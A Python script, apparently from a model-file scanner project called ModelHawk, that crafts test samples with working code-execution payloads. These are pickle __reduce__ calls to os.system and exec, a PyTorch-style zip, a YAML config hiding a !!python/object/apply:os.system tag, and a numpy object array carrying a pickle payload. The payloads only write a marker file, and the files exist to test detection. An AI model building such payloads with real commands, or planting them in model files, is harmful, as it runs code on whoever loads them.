#!/usr/bin/env python3
"""
make_samples.py - ModelHawk's offensive half.

Crafts intentionally-malicious (but HARMLESS) model files so you can watch the
scanner catch a real exploit chain end-to-end.

ATTACK VECTORS DEMONSTRATED
  1. Pickle RCE  - __reduce__ trick in .pkl and PyTorch .pt (zip-wrapped)
  2. Unsafe YAML - !!python/object/apply tag in a realistic-looking config file
  3. Numpy object array - pickle payload embedded in a .npy with dtype=object

HOW PICKLE RCE WORKS
    During unpickling, Python calls obj.__reduce__() and *executes* the
    (callable, args) tuple it returns. Building the file does NOT run the
    payload — pickle.dumps only *records* it. The payload fires only on load.
    ModelHawk detects it statically without loading.

HARMLESS BY DESIGN
    Every payload only writes a 'PWNED.txt' marker (or echoes text). No
    deletion, persistence, or network activity. Even so:

        DO NOT pickle.load() / torch.load() / yaml.load() / np.load() these.
        Scan them:   python modelhawk.py samples/
"""
import json
import os
import pickle
import struct
import zipfile
from collections import OrderedDict

MARKER = "PWNED.txt"
# These strings are inert DATA inside the pickle; they only run if a victim
# *loads* the file. They simply drop a marker so a demo is visible.
_OS_CMD = f"echo You just executed code hidden in an ML model. > {MARKER}"
_EXEC_CODE = f"open({MARKER!r}, 'a').write('PWNED via builtins.exec\\n')"


class _ShellPayload:
    """__reduce__ -> os.system(cmd).  os.system serializes as nt.system / posix.system."""

    def __init__(self, cmd):
        self.cmd = cmd

    def __reduce__(self):
        import os as _os
        return (_os.system, (self.cmd,))


class _ExecPayload:
    """__reduce__ -> builtins.exec(code)."""

    def __init__(self, code):
        self.code = code

    def __reduce__(self):
        return (exec, (self.code,))


def _benign_state_dict():
    """A tiny fake model state_dict - only the benign 'collections.OrderedDict' global."""
    return OrderedDict([
        ("layer1.weight", [[0.1, 0.2], [0.3, 0.4]]),
        ("layer1.bias", [0.0, 0.0]),
        ("meta", {"arch": "demo-net", "params": 6}),
    ])


def _safetensors_bytes():
    """Minimal structurally-valid safetensors file: <u64 len><JSON header><data>."""
    header = {
        "weight": {"dtype": "F32", "shape": [1], "data_offsets": [0, 4]},
        "__metadata__": {"note": "ModelHawk safe-format demo"},
    }
    hb = json.dumps(header).encode("utf-8")
    return struct.pack("<Q", len(hb)) + hb + struct.pack("<f", 0.0)


# --------------------------------------------------------------------------- #
# YAML attack-vector samples
# --------------------------------------------------------------------------- #

_YAML_PAYLOAD = b"""\
# Looks like a harmless model configuration
model_config:
  architecture: resnet50
  num_classes: 1000
  pretrained: true
  weights_url: https://example.com/weights.pt

# Hidden payload: yaml.load() without SafeLoader executes this
metadata: !!python/object/apply:os.system
  - echo You just executed code hidden in a YAML config > PWNED.txt
"""

_BENIGN_YAML = b"""\
model_config:
  architecture: resnet50
  num_classes: 1000
  pretrained: true
training:
  lr: 0.001
  epochs: 100
"""


# --------------------------------------------------------------------------- #
# Numpy object-array attack-vector samples (no numpy dependency)
# --------------------------------------------------------------------------- #

def _make_npy_bytes(pickle_payload: bytes) -> bytes:
    """
    Craft a minimal numpy .npy v1 file with dtype=object.
    Layout: magic(6) + version(2) + hdr_len(2) + header + pickle_payload.
    Header padded so (10 + header_len) is a multiple of 64 (numpy spec).
    """
    raw = b"{'descr': '|O', 'fortran_order': False, 'shape': (1,), }"
    # (10 + len(raw) + padding + 1_newline) % 64 == 0
    remainder = (10 + len(raw) + 1) % 64
    padding = (64 - remainder) % 64
    header = raw + b" " * padding + b"\n"
    return b"\x93NUMPY\x01\x00" + len(header).to_bytes(2, "little") + header + pickle_payload


def _make_benign_npy_bytes() -> bytes:
    """Minimal .npy v1 for a 4-element float32 array (no pickle, safe)."""
    raw = b"{'descr': '<f4', 'fortran_order': False, 'shape': (4,), }"
    remainder = (10 + len(raw) + 1) % 64
    padding = (64 - remainder) % 64
    header = raw + b" " * padding + b"\n"
    data = struct.pack("<4f", 1.0, 2.0, 3.0, 4.0)
    return b"\x93NUMPY\x01\x00" + len(header).to_bytes(2, "little") + header + data


def build_samples(out_dir):
    """Write the demo corpus into out_dir. Returns the list of file paths."""
    os.makedirs(out_dir, exist_ok=True)
    written = []

    def write(name, data):
        path = os.path.join(out_dir, name)
        with open(path, "wb") as f:
            f.write(data if isinstance(data, (bytes, bytearray)) else data)
        written.append(path)
        return path

    # 1) Benign baseline (protocol 5).
    write("benign_state_dict.pkl", pickle.dumps(_benign_state_dict(), protocol=5))

    # 2) Malicious pickle - both protocol 2 (GLOBAL opcode) and
    #    protocol 5 (STACK_GLOBAL opcode) to exercise both detection paths.
    for proto in (2, 5):
        write(f"malicious_os_system.p{proto}.pkl",
              pickle.dumps(_ShellPayload(_OS_CMD), protocol=proto))
        write(f"malicious_exec.p{proto}.pkl",
              pickle.dumps(_ExecPayload(_EXEC_CODE), protocol=proto))

    # 3) Malicious payload wrapped in a PyTorch-style zip (.pt).
    pt_path = os.path.join(out_dir, "malicious_pytorch_model.pt")
    payload = pickle.dumps(_ShellPayload(_OS_CMD), protocol=2)
    with zipfile.ZipFile(pt_path, "w") as z:
        z.writestr("archive/data.pkl", payload)
        z.writestr("archive/version", "3\n")
        z.writestr("archive/data/0", b"\x00\x00\x00\x00")
    written.append(pt_path)

    # 4) Safe modern format (no pickle at all).
    write("safe_model.safetensors", _safetensors_bytes())

    # 5) YAML attack vector: !!python/object/apply tag in a "config" file.
    write("malicious_config.yaml", _YAML_PAYLOAD)
    write("benign_config.yaml", _BENIGN_YAML)

    # 6) Numpy object-array attack vector: pickle payload in a .npy file.
    npy_payload = pickle.dumps(_ShellPayload(_OS_CMD), protocol=3)
    write("malicious_object_array.npy", _make_npy_bytes(npy_payload))
    write("benign_float_array.npy", _make_benign_npy_bytes())

    return written


if __name__ == "__main__":
    import sys

    out = sys.argv[1] if len(sys.argv) > 1 else os.path.join(
        os.path.dirname(os.path.abspath(__file__)), "samples")
    files = build_samples(out)
    print(f"[+] wrote {len(files)} sample(s) to {out}")
    for f in files:
        print("    ", os.path.basename(f))
    print("\n[!] These contain a REAL (harmless) exploit chain. Do NOT load them - scan them:")
    print(f"    python modelhawk.py {out}")
